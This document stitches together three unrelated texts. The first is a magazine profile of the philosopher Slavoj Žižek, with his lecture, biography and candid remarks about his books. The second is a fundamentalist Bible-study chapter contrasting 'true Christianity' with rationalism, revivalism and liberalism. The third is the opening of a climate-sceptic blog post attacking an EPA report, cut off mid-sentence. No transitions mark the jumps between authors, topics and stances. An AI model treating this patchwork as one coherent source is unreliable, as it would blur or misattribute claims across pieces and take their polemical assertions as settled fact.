There are a few middle - aged , smartly dressed people in attendance as well as a handful of old leftists with long hair and caps , but the majority of the audience are young and stylishly dishevelled , the kind of people one would expect to see at a Hot Chip or Vampire Weekend gig .
They have gathered here to listen to a 61 - year - old Slovenian philosopher called Slavoj Žižek , whose critique of global capitalism now stretches to more than 50 books translated into more than 20 languages .
Žižek describes himself as " a complicated communist " and , as if to complicate things further , he deploys the psychoanalytical theories of the late French thinker Jacques Lacan to illustrate the ways in which capitalist ideology works on the collective imagination .
" I do n't give clear answers to even the simplest , most direct questions , " Žižek says .
" I like to complicate issues .
I hate simple narratives .
I suspect them .
This is my automatic reaction . "
Žižek 's book titles reflect his playful and often self - contradictory theoretical thrust .
They include : The Ticklish Subject , which deals with " the spectre of the Cartesian subject in western thought " ;
The Plague of Fantasies , which analyses the ways in which " audiovisual media clouds the ability to reason and understand the world " ; and the wonderfully titled Did Somebody Say Totalitarianism ? , a fierce critique of " the liberal - democratic consensus " .
He seems drawn to taking unfashionable stances that make him unpopular with traditionalists of whatever political hue .
A recent book , In Defence of Lost Causes , argued that , in philosophical - political terms , Heidegger 's fascist sympathies and Foucault 's support of the Iranian revolution were " right steps in the wrong direction " .
Rebecca Mead , writing in the New Yorker , dubbed him " the Marx Brother " and described his approach thus : " His favoured form of argument is paradox , and his favoured mode of delivery is a kind of vaudevillian overstatement , buttressed by the appearance of utter conviction . "
That just about nails it – except that it overlooks the seriousness of Žižek 's thinking and the way he has managed to bring dialectics into the mainstream .
" Slavoj is unique in that he operates between two different and , for the most part , exclusive , places , " says the film - maker Sophie Fiennes , who directed him in The Pervert 's Guide to the Cinema , a documentary that is as provocative as its title suggests , but in a strictly intellectual way .
" He has been incredibly successful in taking theory out of the ivory tower of academia and into the world .
He challenges the current fear of words like ' ideology ' and , correctly in my view , sees this fear as a product of our information culture .
It is also , he argues , a fear of what real , deep political thinking might generate in terms of unrest and discontent . "
Žižek , though , is also a political provocateur and an absurdist prankster .
For one of his books , he wrote a ( rejected ) fictional autobiographical blurb : " In his free time , Žižek likes to surf the internet for child pornography and teach his small son how to pull the legs off spiders . "
As an avowed atheist , he sees no contradiction in arguing , as he did in The Fragile Absolute : Or Why is the Christian Legacy Worth Fighting For ? , for a world in which Christians and Marxists unite against " the contemporary onslaught of vapid spirituality " .
This kind of thing does not sit well with traditional analytical philosophers .
Neither does his tendency to roam freely through high and low culture , illuminating the Lacanian undercurrents in Hitchcock as well as Hegel , Leibniz and David Lynch .
( In his new book , Living in the End Times , there is a serious , and seriously funny , essay on Kung Fu Panda , the recent DreamWorks animation , which Žižek insists is " a somewhat naive , but nonetheless basically accurate , illustration of an important aspect of Lacanian theory . " )
Despite , or perhaps because of , his iconoclasm , his tendency to contradict himself , and his general political incorrectness – which may , one suspects , be more mischievous than heartfelt – Žižek is to today what Jacques Derrida was to the 80s : the thinker of choice for Europe 's young intellectual vanguard .
This fills him with dismay .
Unlike Derrida , though , he is determinedly left wing , if not in the traditional sense .
" I am what you might call abstractly anti-capitalist , " he says .
" For instance , I am suspicious of the old leftists who focus all their hatred on the United States .
What about Chinese neo-colonialism ?
Why are the left silent about that ?
When I say this , it annoys them , of course .
Good !
My instinct as a philosopher is that we are effectively approaching a multicentric world , which means we need to ask new , and for the traditional left , unpleasant questions . "
Unlike the dapper Derrida , Žižek is a sight for sore eyes : pale to the point of sallow , bearded , overweight and effortlessly eccentric .
In the 2005 documentary , Žižek ! , he gives director Astra Taylor a tour of his kitchen , opening drawers and cupboards containing not cutlery and china , but his socks , underpants , trousers and shirts .
His day - to - day style – if that is not too extravagant a word – consists of several dull variations on the proletarian outfit of ill - fitting T - shirt , baggy jeans , free airline socks – " Lufthansa are the best " – and lumpen footwear surely sold exclusively by a Slovenian shoeshop that has somehow missed the collapse of the Soviet bloc .
( A Slovenian friend claims she recently saw him striding though Ljubljana in a T - shirt bearing the slogan " I Am Beautiful " ; it 's difficult to imagine any other philosopher doing that . )
When he speaks , or writes , Žižek comes alive and his thoughts flow out in what seem like uncontrollably tangential torrents .
His message , at least what one can decipher of it from his scattergun approach , is both politically pessimistic and philosophically elusive .
" If you ask me if I am an optimist , I would have to say no .
I am not one of those old - fashioned communists who says , with that old tragi-comic Marxist satisfaction , at least history is on our side .
No .
If anything , the train of history is hurtling towards a precipice .
The task of the leftist thinker today is , to quote Walter Benjamin , not to ride the train of history , but to pull the brake . "
In the jam - packed auditorium of the French Institute in Barcelona , Žižek speaks for more than two - and - a - half hours without once pulling the brake .
His central thesis , also explored in his new book , Living in the End Times , is that " the global capitalist system is approaching an apocalyptic zero point . "
Žižek , though , regards the idea of a central thesis in much the same way that the great jazz saxophonist John Coltrane regarded a melody – as something to riff off , extemporise on , and return to only when all associated sub - themes have been exhausted .
This approach has its problems , not least the sense that a single Žižek riff could perhaps more profitably be extended into an entire lecture that might be both deeper and more illuminating .
Tonight , for instance , he barely addresses the reason why he resolutely believes in communism despite its shredded reputation .
" I do n't see any continuity with old - style communism in my approach .
So why do I then call it communism ? " he says when I ask him about it later .
" As to its contents , though , the problem is always the same .
It 's the enclosure of the commons .
Marx was talking about land and property when he wrote about this , but today intellectual property is our commons , information is our commons .
Something that Marx could not have predicted is taking place today : we are witnessing a strange regression to the same kind of enclosure of the commons , and people having to pay rent to people like Bill Gates for intellectual property . "
He seems a slave to the speed of his thoughts , his motor - mouth delivery barely keeping pace with the frenetic motion of his overcrowded mind .
Silence , even a pause for breath , seems to make him intensely uncomfortable .
So , too , does the company of strangers .
" I avoid other people if I can .
The ultimate nightmare for me is a party in my honour in the United States .
Having to mix and talk , to strangers , maybe 20 or 30 people who want to have a debate or , even worse , polite conversation .
My God , I hate this above all , but it is the nature of my tragic life . "
To witness Žižek in full flight is a wonderful and at times alarming experience , part philosophical tightrope - walk , part performance - art marathon , part intellectual roller - coaster ride .
Most startling of all are the nervous tics that accompany his every utterance : the constant wiping of his beard and lips , the incessant dabbing of his furrowed brow , the closed eyes , clenched fists and the strange gutteral noises that punctuate his speech .
Then , there 's his lisp and his odd mispronunciations – in Barcelona , he kept using the term " a dollar cent " , which I assumed was an example of fiscal insider jargon until I realised he actually meant " adolescent " .
In my notebook , I map out the contours of his lecture in a series of headings .
He begins with the fall of the Berlin Wall and the inevitable , in his view , rebirth of some kind of post - digital global communism , before touching on the writings of his beloved Hegel via the thoughts of Pascal .
Suddenly though , in the first of many conceptual swerves , he is comparing the fall of communism to the end of the silent movie era which leads him into a riff on ideology as represented by " the disembodied voice " in Chaplin 's City Lights and Hitchcock 's Psycho .
From there , we learn how the scene in Fight Club where Brad Pitt 's character punches himself in the face is a metaphor for revolution – " Before you beat the bosses , you must first beat yourself . "
By this point , the faithful are enthralled , the curious baffled and the traditionalists utterly bemused .
Žižek , though , is just warming up .
On and on he roams , through the French and Haitian revolutions , the Iraq war , Rumsfeld 's famous speech about " known unknowns " .
( What about the " unknown knowns ? " , asks Žižek .
" This is exactly how capitalist ideology works ; you follow an illusion without even knowing it . " )
He cites the myth of Santa Claus as a supreme example of ideological indoctrination , dismisses Hollywood 's love of the Dalai Lama and " all this vague , insipid Buddhist bullshit " .
He tells us how cynicism has become western culture 's current default mode , what Christianity can teach communism , and why God is essentially a narcissist .
He touches on biogenics by way of the inevitable Richard Dawkins – " This kind of extreme atheism misses the point of religion entirely " – and illustrates how science has lost its monopoly on truth .
Eventually he realises there is a limit to the collective power of the audience 's concentration , and he ends , as he began , with the communist revolution , informing us that the next one will succeed only if it embraces the essentially Christian , conservative social etiquette of politeness and deference .
About 155 minutes after he started , he suddenly stops , drenched in sweat and bathed in applause .
On cue , an old Trotskyist stands up and takes him to task for betraying the cause … .
" I hate these civilised debates followed by the questions from the audience , " he tells me the next morning .
" So I keep going to subvert this boring ritual , but always there will be one old unreconstructed leftist who will stand up and accuse me of being a Stalinist .
This , " he says , sighing , " is how it goes . "
The son of Slovenian communists , Žižek was born on 21 March 1949 in what was then Yugoslavia .
His father was a state economist , his mother an accountant for a state - run business .
I ask him if , growing up by the sea in Portorož , he had a happy childhood .
" No .
You could say , in a vulgar Freudian way , that I am the unhappy child who escapes into books .
Even as a child , I was most happy being alone .
This has not changed . "
As a teenager , living in the capital Ljubljana , he read voraciously and , he says , " did pretty well at high school though I completely ignored the curriculum " .
At 15 , he wanted to be a " movie director " but soon realised that his love of theory surpassed even his passion for film .
At university in the 1960s , he was seduced by the new wave of French post - structuralist theorists – Derrida , Michel Foucault , Julia Kristeva and , above all , Jacques Lacan .
His postgraduate thesis was initially rejected for being too critical of Marx , and even though he amended it , he was deemed unfit to teach philosophy .
" It is very ironic how professors who attacked me for not being a Marxist have now turned nationalist and attack me for being a Marxist .
But , really , I do n't care . "
In the 1970s , Žižek made a living by translating works of philosophy and , at one point , took himself off to France for four years .
He also did four years ' national service in the Yugoslavian army .
He has no bitterness about that .
" My formative experience was Yugoslav self - management socialism , " he says , " but Slovenia had communist rule without an official philosophy so it was superficially better than anywhere else . "
In 1978 , he finally landed a job at what he calls " a marginal research institute " .
It was , he says , " a kind of banishment but also a wonderful post .
Just pure research . "
He made contacts with philosophy institutions in France and the US , which stood him in good stead when he finally published his breakthrough book , 1989's The Sublime Object of Ideology .
" Without the communist oppression , " he says , quite seriously , " I am absolutely sure I would now be a local stupid professor of philosophy in Ljubljana . "
In 1990 , he baffled his leftist friends and supporters by standing for election as a Liberal Democratic party candidate .
He came fifth .
" Politics is my tragedy , " he tells me dolefully .
" It shadows me . "
When not travelling or teaching in America or Europe – he has held posts at Columbia , Princeton and is international director of humanities at Birkbeck College , London – Žižek lives alone in Ljubljana in a small apartment full of books , DVDs , classical music CDs – " I am a committed Wagnerian and , this will shock you , I even like Elgar . "
Depending on whom you believe , he has been married and divorced two or three times .
He is not saying .
On April Fool 's day , 2005 , he famously wed a 27 - year - old former lingerie model and Lacanian scholar from Argentina .
He has two sons , one in his early 30s , the other nine years old .
When I leave him , he heads off to find an iPad as a present for his youngest child .
" I am a hypocritical communist , no ? "
In the flesh , Žižek is , if anything , more demonic and unhealthy - looking than his photographs , his matted hair and greying beard surrounding a face that looks like it 's never seen sunlight .
He suffers from diabetes , a condition not helped by his nomadic lifestyle and manic disposition .
" I have exploited you , " he says by way of greeting , " in order to have a few hours free from the duties these Spanish leftists expect me to perform . "
He seems both eager and uncomfortable and ushers me quickly upstairs to the apartment that is his temporary home .
As a cleaner flits about , I ask him if he is surprised at his popularity , particularly among the young .
" My God , I am the last person to know the answer to these questions , " he says , looking genuinely dismayed .
" But , really , I am now thinking there is so much pressure on me to perform .
I am getting really bored with it .
I am a thinker , but people all the time want this kind of shitty political interventions : the books , the talks , the discussions and so forth . "
He sighs and closes his eyes and seems to deflate before my eyes .
" I will tell you my problem openly and for this my publisher will hate me .
All the talk and the writing about politics , this is not where my heart is .
No .
I have been sidetracked .
I really mean this . "
He opens a copy of Living in the End Times , and finds the contents page .
" I will tell you the truth now , " he says , pointing to the first chapter , then the second .
" Bullshit .
Some more bullshit .
Blah , blah , blah . "
He flicks furiously through the pages .
" Chapter 3 , where I try to read Marx anew , is maybe OK .
I like this part where I analyse Kafka 's last story and here where I use the community of outcasts in the TV series Heroes as a model for the communist collective .
But , this section , the Architectural Parallax , this is pure bluff .
Also the part where I analyse Avatar , the movie , that is also pure bluff .
When I wrote it , I had not even seen the film , but I am a good Hegelian .
If you have a good theory , forget about the reality . "
Why , then , given that he does not like most of his books and does not have any enthusiasm for the lecture circuit , does he not call a stop to the Žižek show ?
" I am doing that right now ! " he shouts .
" I am writing a mega - book about Hegel with regard to Plato , Kant and maybe Heidegger .
Already , this Hegel book is 700 pages .
It is a true work of love .
This is my true life 's work .
Even Lacan is just a tool for me to read Hegel .
For me , always it is Hegel , Hegel , Hegel , " he says , sighing again .
" But people just want the shitty politics . "
Reviewing In Defence of Lost Causes , the British Marxist critic Terry Eagleton concluded that it was " a frenetic , eclectic parody of intellectual scholarship , by one so assured in his grasp of the finer points of Kafka or John le Carré that he can afford to ham it up a little . "
Only time will tell if Žižek is serious about becoming utterly serious , but if he devotes the rest of his brilliant , brainy , slightly bonkers , utterly singular life to Hegel , and Hegel alone , it will be a great gain for pure philosophy and a great loss to radical , risk - taking political theory .
" He is very much a thinker for our turbulent , high speed , information - led lives , " says Sophie Fiennes , " precisely because he insists on the freedom to stop and think hard about who you are as an individual in this fragmented society .
We need a radical hip priest and Slavoj is that in many ways . "
The very thought , I suspect , would have him quaking in his proletarian boots – and free airline socks .
Living in the End Times is published on 5 July by Verso , £ 20 .
To order a copy for a special price go to observer .co.uk / bookshop or call 0330 333 6847 .
Žižek appears at the London literature festival , Southbank Centre , London SE1 on 5 July , 7.30 pm .
CHAPTER 13
Where Are You Standing ?
RATIONALISM , REVIVALISM , MODERNISM ,
LIBERALISM & FUNDAMENTALISM
THE PROBLEM OF RATIONALISM
Rationalism has been a problem throughout the years of church history , especially in more recent centuries .
WHAT IS RATIONALISM ?
Why is it a problem ?
Why is it dangerous ?
When you think of the word RATIONALISM you should think of the word REASON .
RATIONALISM is a RELIANCE upon REASON in order to determine what is true .
RATIONALISM places a high value on HUMAN REASON ( what man thinks ) and places a low value ( or no value ) on DIVINE REVELATION ( what God has said in His Word , the Bible ) .
The emphasis is upon REASON rather than REVELATION ( God 's revealed truth ) .
HOW SHALL I FIND OUT THE TRUTH ABOUT LIFE AND WHAT IT IS ALL ABOUT ?
The Lord Jesus Christ said , " THY ___________ ( Gods Word ) IS ____________ " ( John 17:17 ) .
" If ye continue in My ___________ then are ye My disciples indeed ( My true disciples ) , and ye shall know _______ ____________ and ______ _____________ shall make you free ! " ( John 8:31 - 32 ) .
Rationalism says this : IF YOU WANT TO FIND OUT THE TRUTH , DEPEND UPON YOUR MIND AND UPON YOUR THINKING .
Dont open the Bible , but instead use your mind and THINK !
GOD SAYS : " Trust in the Lord .. and
LEAN NOT ( DONT LEAN ) UNTO
thine own understanding . "
Proverbs 3:5 RATIONALISM
SAYS : LEAN ( depend , rely ) UPON
YOUR OWN UNDERSTANDING !
See Isaiah 65:2
WHERE ARE YOU STANDING ?
MAN'S REASON
IS SUPREME G OD'S TRUTH
IS SUPREME Of Myself , By Myself , For Myself
I AM MY OWN FINAL AUTHORITY .
Everything is judged and tested by human reason .
Everything is judged and tested by Gods Word : " Prove all things ( test all things by the Word of God ) " -l Thess .
5:21 " It must be true because it makes sense to me and to my way of thinking .
It s reasonable .
It s logical to me and to my way of trying to put things together . "
" It must be true because God says so .
I know nothing .
God knows everything . "
THIS THINKER IS DEPENDING ON HIS OWN REASON .
HE THINKS HIS THINKING WILL BRING HIM TO TRUTH .
THIS BELIEVER IS DEPENDING ON THE WORD OF GOD .
HE KNOWS THE BIBLE IS TRUTH .
What is wrong with RATIONALISM ?
To answer this we must answer another question : WHAT IS WRONG WITH MANS REASON ?
What is wrong with mans thinking ?
MANS THINKING CANNOT BRING MAN TO A KNOWLEDGE OF THE TRUTH !
Why not ?
Ever since the fall of man ( Genesis 3 ) the mind of man has been out of tune and out of touch with reality ( because it is out of tune and out of touch with God ) .
Fallen men do not think correctly .
Sin has affected the mind and the thinking of men .
Notice this description of mans thinking before the great Genesis Flood : " And God saw that the wickedness of man was ________________ in the earth and that EVERY imagination of the _________________ of his heart ( his mind ) was only _______________ continually " ( Genesis 6:5 ) .
In the New Testament we have another description of the mind of fallen , unsaved men : " that ye henceforth walk not as other GENTILES walk , in the ________________ ( emptiness , their minds were devoid of truth ) of their ______________ , having the _____________________ darkened ( they are blind ) , being alienated ( separated ) from the life of God ( they are dead , having no real and right relationship with God ) , through the ___________________ that is in them , because of the ____________________ ( hardness ) of their heart " ( Eph. 4:17 - 18 ) .
In light of this verse , consider what the rationalist is standing upon :
See also Titus 1:15 which tells us more about the condition of the mind of fallen , unsaved men : " Unto the pure all things are pure : but unto them that are defiled and unbelieving is nothing pure ; but EVEN THEIR _________________ and conscience is DEFILED . "
It is the mind that is defiled and polluted by sin .
" Sin has so twisted and perverted the intellect of the natural man and Satan has so blinded his mind that he often thinks he knows more than God .
Pride leads him to exalt his own mentality to such an extent that , if God says anything which his tiny intellect and puny reason cannot comprehend , then he declares Gods saying  foolishness .
He boldly proclaims Gods sacred truth to be fable ; Gods eternal word to be an earth - born myth .
His endeavor to fathom Gods ocean of truth with his little teacup of a mind is pathetic , and his arrogant method of casting aside Gods supernatural revelation when it goes contrary to his sin-saturated reason is pitiful indeed . "
( Ruth Paxson , Life on the Highest Plane , p.74 )
Since sinful man is separated from a HOLY GOD ( Isaiah 59:2 ) , the mind of sinful man is separated from TRUTH because God is the SOURCE of all truth .
All truth comes from God , and if a person is separated from God he is separated from the truth of God :
Not only is the mind of man separated from the truth of God , but the mind of man is actually OPPOSED TO GOD .
Mans mind is AGAINST GOD and is an enemy of God !
Romans 8:7 says , " Because the ______________ mind ( the fallen , fleshly mind of man ) is ENMITY AGAINST GOD . "
( It is HOSTILE toward God , at odds , at war , in rebellion against God ) .
The mind of man is at war against God and it is at war against what God says .
READ ISAIAH 55:6-9 .
MAN IS TO FORSAKE AND TURN AWAY FROM HIS OWN THOUGHTS
Man is going the wrong way and thinking the wrong thoughts ( verse 7 ) .
MAN IS TO TURN UNTO THE LORD WHOSE THOUGHTS ARE HIGH AND HOLY AND HEALTHY .
There is no problem with Gods thinking .
Man needs to turn to Him and trust Him ( verses 6 - 7 ) .
RATIONALISM is not a solid foundation to stand upon .
Rationalism will lead us astray .
We must not lean upon our own understanding and our own reasoning and our own thinking .
Here are some examples of how rationalism can get people off track :
1 ) The Word of God ( the Bible ) reveals that there is ONE GOD and this ONE GOD reveals Himself in THREE PERSONS  Father , Son and Holy Spirit .
He is ONE but He is THREE .
He is THREE but He is ONE .
To many people this does not make sense .
How can
He be THREE and yet ONE ?
It is not logical .
It seems to go against reason .
Therefore many people do not believe in the Trinity .
They lean upon their own understanding and their own understanding does not help them know WHO GOD REALLY IS .
There are many things that our little , puny minds cannot understand and cannot grasp .
God wants us to BELIEVE even though we may not understand .
It may not make sense to us , but it makes sense to God !
2 ) A man might reason in this way : " Every person that I have ever known has had a father and a mother .
There is not one man on earth that did not have a father and a mother at one time .
Jesus was man , therefore
He must have had a father and a mother too .
He must have been a man like all other men that I know . "
This may be logical and reasonable , but it is very wrong .
The Lord Jesus was a Man , but He was a UNIQUE MAN .
He was not like every other man .
He had a mother but had no earthly father .
He was the Son of God and was born of a virgin .
God was His Father .
He was a Man but He was also God !
He was the Son of God and He was God the Son. Reason apart from revelation will lead you astray .
3 ) Miracles go against reason .
The Bible tells us about many miracles which God accomplished by His power and for His all - wise purposes .
For example , it does not make sense that a man ( Peter ) could walk on the water .
Everyone knows that people cannot and do not walk on water .
Also it does not make sense that a crowd of 5000 people ( not counting women and children ) could be fed from just five loaves and two fish .
This is unreasonable .
It could not happen .
It is physically impossible .
Mans reason says , " IT IS IMPOSSIBLE . "
Divine revelation says , " WITH GOD ALL THINGS ARE POSSIBLE " ( see LUKE 1:37 ) .
Unbelieving men using their reason try to explain away the miracles in a way that will satisfy their minds .
Here are examples of a couple of foolish explanations :
" The Lord did not really walk on the water , because that is impossible .
Instead
He was actually walking on a sandbar .
When Peter got out of the boat , he too stepped onto the sandbar .
But after a few steps he walked off the sandbar into the deeper water .
The Lord had to reach out and pull him back up . "
" The crowd of 5000 was not really fed from just five loaves and two fish because this is impossible .
It is impossible because my mind just cannot see how this could happen .
This is what really must have happened :
The crowd was very selfish .
They all had their lunches hidden away under their tunics .
When they saw the young lad share his lunch with the Lord then they all felt ashamed that they had been so selfish and they began pulling out their lunches .
Thus there was plenty of food for everyone and even much food that was left over . "
What do you think of these explanations ?
Do they make sense ?
Are they reasonable ?
Do you see any problems with them ?
It is much better just to believe what God says and take Him at His Word !
What is it that governs your life ?
Is it your thoughts or Gods thoughts ?
Is it your reason or Gods revelation ?
Is it your wisdom or Gods Word ?
WHAT ARE YOU STANDING UPON ?
Listen to Pauls wise words spoken nearly 2000 years ago :
THE PROBLEM OF REVIVALISM
That which is dead or nearly dead needs to be REVIVED .
There is the right kind of revival which comes from GOD ( He is the Source of all LIFE ) and there is the wrong kind of revival that comes from MAN .
What we are considering in this section is the WRONG KIND of revival .
DEADNESS has been a very real problem throughout the centuries of church history .
The religion of man is often very dead and lifeless .
People gather in a church building and they follow a dead ritual .
They go through the motions without any meaning .
They stand up and sit down and light candles and repeat phrases , but none of it has anything to do with reality and life .
The reason for the deadness is that there is no real and right relationship with the God of life .
Many people throughout the years of church history have recognized the deadness and have cried out for something more .
They got tired of sitting in the middle of a dead and impersonal church building and going through the weekly ritual .
They wanted a religious experience that would be real and exciting and meaningful and personal .
What they needed was a PERSONAL RELATIONSHIP with Christ , but often what they looked for was a PERSONAL EXPERIENCE .
They wanted something that they could touch or feel or sense .
The emphasis was not on BELIEVING but on FEELING .
This wrong kind of revivalism is seen in many groups throughout church history such as the Quakers ( with their emphasis on the " inner light " ) , the followers of Edward Irving in 19th century England ( with their many prophets and prophecies ) and the Pentecostal / Charismatic movement of today ( with the emphasis on experiencing the gift of tongues , and having dreams , prophecies , added revelations , miracles , healings , etc. ) .
Where are you standing ?
Consider the chart on the following page :
WHERE ARE YOU STANDING ?
MAN'S EMOTIONS
ARE SUPREME G OD'S TRUTH
IS SUPREME " I do n't want to believe .
I want to feel and experience ! "
" I want to use the mind God has given me to learn
His truth as He teaches me . "
BASED ON SUBJECTIVE EXPERIENCE BASED ON OBJECTIVE TRUTH
" It must be true because IVE EXPERIENCED IT ! "
" It must be true because GOD SAID IT ! " " This is how I feel ! " " This is what God has said ! "
Lets compare all three of these foundations ( only one of these three foundations is ROCK SOLID ) :
FUNDAMENTALISM
What is a FUNDAMENTALIST ?
A fundamentalist is a person who stands firmly upon the solid foundation of Gods Word ( like the person on the diagram above ) .
The word " fundamental " is related to two Latin words :
1 ) fundus ( ground , the bottom or base of anything ) and ( 2 ) fundamentum ( a foundation , basis ) .
Thus when you think of the word FUNDAMENTAL you should think of the word FOUNDATION .
A fundamentalist is a person who stands firmly upon the fundamentals .
A fundamentalist stands firmly upon THE SOLID FOUNDATION of Gods Word , the Bible .
During the 20th century there has been a great battle raging between those men and churches who believe the Bible and those men and churches who do not .
In 1910 a very important set of books was published by a group of Bible believing men called THE FUNDAMENTALS .
These books contained many articles which presented the truth of Gods Word and urged men to stand firmly upon rock solid foundational truths of the Bible such as these :
THE PROBLEM OF MODERNISM AND LIBERALISM
Modernism and Liberalism are two names which basically describe the same thing .
Both of these movements could be described by another term : UNBELIEF !
Both of these movements deny and disbelieve the Word of God .
This is illustrated on the following page :
Liberalism is just another name for modernism .
The modernist and the liberal are really one and the same :
Are there some things that never change ?
Does the Lord Jesus Christ ever change ( Hebrews 13:8 ) ?
Does Gods Word ever change ( Matthew 24:35 ) ?
Do the thoughts , opinions , ideas and philosophies of men ever change ?
How solid a foundation does the liberal stands upon ?
On the following two pages there is a helpful chart which shows the differences between LIBERALISM ( Modernism ) and TRUE CHRISTIANITY ( Fundamentalism ) .
CONCLUSION
Where are you standing ?
On what are you standing ?
What is your FOUNDATION ?
How solid is your foundation ?
Is your foundation a ROCK SOLID foundation such as we studied in chapter 1 of these notes ?
How firmly are you standing on this foundation ?
In these lessons on church history we have seen some of the many problems that arise when men refuse to stand on the solid foundation .
May we not repeat the mistakes of the past .
May the God of truth and the truth of God be our sure and safe and solid foundation now and forevermore !
The Difference Between
LIBERALISM
and
TRUE CHRISTIANITY
Liberalism ( Modernism ) True
Christianity " They have REJECTED
the Word of the LORD "
and
" What WISDOM is in them ? "
( Jeremiah 8:9 ; Proverbs 1:7 )
They have RECEIVED the Bible not as the word of men but as it is in truth , the Word of God
( 1 Thess .
2:13 ; John 17:17 )
and
they possess the WISDOM OF GOD
( 1 Cor. 2:13 - 14 ; Eph. 1:17 ; Prov. 1:7 ) * The Bible CONTAINS the Word of God .
We can subjectively pick and choose what parts of the Bible are true .
The Bible IS the Word of God. All Scripture is given by inspiration of God ( 1 Timothy 3:16 and compare 2 Peter 1:20 - 21 ) .
* Jesus Christ was a GOOD MAN , probably the BEST MAN that has ever lived .
Jesus Christ is the GOD - MAN , the CREATOR , the blessed Son of Man , the eternal Son of God ( John 1:1,2,3,14,etc . ) .
* The birth of Jesus Christ was NATURAL ( see Isaiah 7:14 in the Revised Standard Version ) .
The birth of Jesus Christ was SUPERNATURAL ( Matthew 1:20 - 23 and Luke 1:37 ) .
* Jesus Christ died as our EXAMPLE .
Jesus Christ died as our SUBSTITUTE ( Isaiah 53:6 and 2 Corinthians 5:21 ) .
God is the FATHER OF ALL MEN ( the universal Fatherhood of God ) .
GOD'S CHILDREN are only those who have put their faith in Christ ( John 1:12 ) .
Many people have the devil as their father ( John 8:44 ) .
All men are BROTHERS ( the universal brotherhood of man ) .
Not everyone belongs to the same family .
There are TWO FAMILIES ( 1 John 3:10 ) .
* Man is the product of EVOLUTION .
Man was CREATED directly by God ( Gen. 1:26 - 27 ; 2:7 and Matthew 19:4 ) .
* Man is the unfortunate VICTIM of heredity and environment , but through self - culture and self effort , he can save himself .
Man is a SINNER , fallen from original innocence , and unless he receives the Lord Jesus Christ , he is eternally lost ( John 3:16 - 21 ; Rom. 3:23 - 24 ) .
* Man is justified by WORKS in following Christ 's example .
The result : natural development from WITHIN .
Man is justified by FAITH in the atoning blood of Christ .
The result : supernatural regeneration from ABOVE ( John 3:3 ; Rom. 5:1,9 ; Tit. 3:4-6 ) .
There are MANY ROADS that lead to Heaven .
Jesus Christ is the ONLY WAY ( John 14:6 ; Acts 4:12 ) .
ALL MEN WILL EVENTUALLY BE SAVED ( UNIVERSALISM ) .
ONLY A FEW WILL FINALLY BE SAVED ( Matthew 7:13 - 14 ) , although God 's salvation is freely offered to all ( Rev. 22:17 ) .
* Those sections marked with an asterisk ( * ) are taken from or adapted from the excellent tract by Franklin G. Huling entitled Fundamentalism vs. Modernism -- What is the Difference ?
Liberalism ( Modernism ) True Christianity Concerning HELL : A loving God would never condemn anyone to hell .
Those who reject Jesus Christ are condemned already ( John 3:18 ) .
HELL is very real .
The LOVE OF GOD is over - emphasized and the judgment and wrath of God is rarely mentioned .
The judgment and wrath of God is carefully taught ( Rom. 1:18,32 ; 2:3,5,16 ; etc. ) and the love of God is presented in full view of Calvary 's cross ( Rom. 5:8 ; John 3:16 ; etc. ) .
NO WARNING is given about false doctrine , false teachers , etc .
Warning is a key part of a faithful ministry ( Acts 20:28 - 31 ) .
The liberals recognize and tolerate " MANY FAITHS " and " many faith expressions . "
Bible believers recognize that there is only ONE TRUE FAITH ( Jude 3 and Eph. 4:5,13 ) .
ECUMENICAL -- they seek the compromising UNION of all churches and all faiths .
SEPARATIST -- they separate from those churches and individuals who deny the " doctrine of Christ " ( 2 John 9 - 11 ; Rom. 16:17 - 18 ; etc. ) .
SOCIAL GOSPEL and social action CHRIST - CENTERED GOSPEL and
missionary zeal Seek to meet man's PHYSICAL NEEDS ( food , clothing , medicine , etc. ) .
Seek to meet man 's SPIRITUAL NEEDS ( salvation from sin ) first and foremost Concerning the RESURRECTION : " the influence and example of Jesus lives on . "
The Lord Jesus ROSE AGAIN BODILY from the grave and is exalted at the right hand of God ( 1 Corinthians 15 ; Eph. 1:20 - 23 ) .
There is an avoidance of and a disregard for PROPHETIC TEACHING especially concerning the second coming of Christ .
The prophetic statements of Scripture are accepted at face value and the Bible has much to say about the blessed hope that Jesus is coming again ( John 14:3 ; Titus 2:13 ) .
Key Message : " LOVE YOUR NEIGHBOR " " Do unto others " " Obey the Golden Rule " etc. ( MAN - CENTERED ) .
Key Message : " Believe on the Lord Jesus Christ and thou shalt be saved ( Acts 16:31 ; and see 1 Cor. 2:2 and 1 Cor. 15:1 - 4 ) ( CHRIST-CENTERED ) .
Emphasis :
The emphasis is placed on the Gospels -- the earthly life and ministry of Christ ( Jesus as a FELLOW HUMAN ) .
Emphasis :
The emphasis is placed on the crucified , risen , exalted , heavenly Lord who is coming again !
( Jesus as GOD WITH US and GOD FOR US ! )
Note :
In Acts through Revelation there are 183 verses on the death of Christ ; 97 on the resurrection ; 162 on the heavenly life and ministry of Christ ; 203 on the second coming and only 8 verses on the earthly life and ministry of Christ ( Acts 20:35 ; Acts 2:22 ; Acts 10:38 ; 1 Timothy 3:16 ; 1 Timothy 6:13 ; Hebrews 4:15 ; Hebrews 5:7 and 2 Peter 1:15 - 18 ) !
SOME CHARACTERISTICS
OF LIBERAL CHURCHES :
The people meet for worship on Sunday morning only .
Most liberal churches do not have an evening service or a mid-week prayer meeting service .
The people rarely carry Bibles to church and Bibles are not usually found in the pews .
The " clergy " always pray and the people in the pew are never called upon to pray .
The " minister " ( often called " minister " rather than " pastor " ) will never preach verse by verse through a book of the Bible .
The sermons are usually based , not so much on a Bible text ( although verses will be referred to during the course of the sermon ) but on some event that was recently in the news , some political happening , something that was seen on television , etc .
An invitation for salvation will never be given from the pulpit .
The terms " saved " and " unsaved " are rarely used .
NOTE : This chart describes those liberals in the " Protestant " tradition .
However , some of these liberal characteristics may be found and noticed among certain Catholics as well .

Guest Post by Willis Eschenbach
Last month ( April 2010 ) , the US Environmental Protection Agency ( EPA ) put out a study called “ Climate Change Indicators in the United States ” ( 13 Mb PDF ) .
I read through it … depressingly bad science .
To start with , they parrot the findings of the IPCC as their “ evidence ” that everything we see in the climate record is human - caused .
They say :
The buildup of green - house gases in the atmosphere is very likely the cause of most of the recent observed increase in average temperatures , and contributes to other climate changes .
( IPCC 2007 )
Despite the “ very likely ” certainty of the IPCC , I see the current level of our knowledge of the Earth ’s climate a bit differently , as shown in Figure 1 :
Figure 1 . Graph showing our understanding of the climate .
Image is the painting by J. M. W. Turner , “ Rain , Steam and Speed – The Great Western Railway ” .
Having asserted that all changes are due to humans , they then list a bunch of changes , and consider their case as being established .
Here ’s how they put it :
